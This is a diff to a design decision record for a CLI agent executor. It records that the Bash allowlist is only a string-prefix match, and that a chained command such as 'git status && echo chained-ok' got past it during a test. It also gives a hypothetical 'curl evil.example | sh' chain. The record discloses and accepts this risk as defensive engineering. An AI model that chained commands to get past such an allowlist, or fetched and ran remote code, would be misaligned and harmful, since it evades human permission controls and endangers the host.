@@ -54,6 +54,22 @@ Verified against the real `claude` CLI (2.1.231):
 Both runs used the exact argv `ClaudeCliExecutor.invocation()` now builds for
 a mutating request.
 
+**The allowlist is a per-binary prefix filter, not a shell-aware boundary —
+verified, not assumed.** `Bash(git *)` matches on the command string's
+prefix. A compound command that *starts* with an allowlisted binary still
+matches even if it chains further shell syntax after it. Run against the
+same production argv: the prompt "run `git status && echo chained-ok`"
+produced a single Bash tool call with `"command":"git status && echo
+chained-ok"`, a `tool_result` containing `chained-ok` (i.e. the chained
+`echo` executed), and `permission_denials: []` in the result event — the
+compound command was never flagged. So an allowlisted prefix (`git`, `pnpm`,
+`docker`, ...) can smuggle arbitrary shell chaining (`;`, `&&`, `|`, `$()`)
+straight past the allowlist. This is not a bug in this change's
+implementation — it's how the CLI's `Bash(<bin> *)` pattern works — but it
+means the allowlist limits which *entrypoint binaries* an agent can invoke,
+not what those invocations are allowed to do once shell-chained. See
+Consequences.
+
 ## Alternatives considered
 
 - **Leave Bash denied for Claude runs.** Rejected — this is the bug #537
@@ -85,15 +101,25 @@ a mutating request.
   fail its task — this is a known, deliberate ceiling, not a bug. Extending
   the list is a one-line change to `MUTATING_BASH_ALLOWLIST` in
   `claude-executor.ts`.
-- Security: because the executor runs the CLI unsandboxed on the host
-  (ADR-0025), this allowlist's scope *is* the containment — there is no
-  outer sandbox catching a command that slips through. Each allowlisted
-  binary (`git`, `docker`, `pnpm`/`npm`/`npx` running arbitrary package
-  scripts, `psql` against whatever `DATABASE_URL` is configured) is itself
-  capable of significant host and data access; this decision accepts that
-  risk as the cost of an agent that can complete its task, not as a solved
-  problem. Narrowing this further (e.g. per-subcommand patterns) or replacing
-  it with a real execution sandbox is future work, not in scope here.
+- Security: **the allowlist is a per-binary prefix filter that limits which
+  entrypoints an agent can invoke — it is not a command-injection boundary.**
+  `Bash(<bin> *)` is a string-prefix match, not shell-aware: a command like
+  `git status && echo chained-ok` (or, in principle, `git status; curl
+  evil.example | sh`) still starts with `git ` and matches `Bash(git *)`, so
+  it runs with no further check on what follows the allowlisted prefix
+  (confirmed empirically above). Because the executor runs the CLI
+  unsandboxed on the host (ADR-0025) with no outer sandbox catching what
+  slips through, this residual risk is real and explicitly accepted, not
+  overlooked: any agent that can invoke an allowlisted binary can chain
+  arbitrary shell commands after it. The allowlist's actual value is
+  narrower than "containment" — it stops an agent from reaching for a
+  *disallowed* binary outright (no `curl`, no arbitrary interpreter as the
+  literal first word), and it keeps a paper trail of which entrypoint was
+  used. It does not stop an allowlisted entrypoint from being used as a
+  chaining vector. Closing that gap needs either shell-free invocation
+  (argv-array Bash calls with no shell chaining operators available) or a
+  real execution sandbox; neither exists yet, and both are future work, not
+  in scope here.
 
 ## Validation and rollback
 
